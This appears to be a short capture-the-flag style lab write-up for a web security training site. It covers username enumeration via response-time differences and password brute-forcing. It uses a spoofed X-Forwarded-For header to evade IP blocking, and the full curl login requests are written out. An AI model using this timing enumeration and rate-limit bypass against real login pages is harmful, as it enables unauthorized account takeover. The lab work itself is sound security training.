@@ -1,0 +1,25 @@
+
+
+This time we are focus on time to response
+if username is true then check password so need more time to check it
+and if my ip blocked use
+	"X-Forwarded-For: 85"
+header and change value to bypass that
+
+curl -i -s -k -X $'POST' \
+    -H $'Host: 0a5200de04e1832585fbc7d2003e009d.web-security-academy.net' -H $'X-Forwarded-For: 85' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 96' -H $'Origin: https://0a5200de04e1832585fbc7d2003e009d.web-security-academy.net' -H $'Referer: https://0a5200de04e1832585fbc7d2003e009d.web-security-academy.net/login' -H $'Upgrade-Insecure-Requests: 1' -H $'Sec-Fetch-Dest: document' -H $'Sec-Fetch-Mode: navigate' -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Fetch-User: ?1' -H $'Sec-Gpc: 1' -H $'Te: trailers' -H $'Connection: keep-alive' \
+    -b $'session=GXbKj35KYIx119PtnVTZyI6mb9xzdxiE' \
+    --data-binary $'username=applications&password=peterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeter' \
+    $'https://0a5200de04e1832585fbc7d2003e009d.web-security-academy.net/login'
+	
+this request have more response time than other response
+
+so start bruteforce password :
+
+curl -i -s -k -X $'POST' \
+    -H $'Host: 0a5200de04e1832585fbc7d2003e009d.web-security-academy.net' -H $'X-Forwarded-For: 41' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 37' -H $'Origin: https://0a5200de04e1832585fbc7d2003e009d.web-security-academy.net' -H $'Referer: https://0a5200de04e1832585fbc7d2003e009d.web-security-academy.net/login' -H $'Upgrade-Insecure-Requests: 1' -H $'Sec-Fetch-Dest: document' -H $'Sec-Fetch-Mode: navigate' -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Fetch-User: ?1' -H $'Sec-Gpc: 1' -H $'Te: trailers' -H $'Connection: keep-alive' \
+    -b $'session=GXbKj35KYIx119PtnVTZyI6mb9xzdxiE' \
+    --data-binary $'username=applications&password=123qwe' \
+    $'https://0a5200de04e1832585fbc7d2003e009d.web-security-academy.net/login'
+	
+and we are in ;)
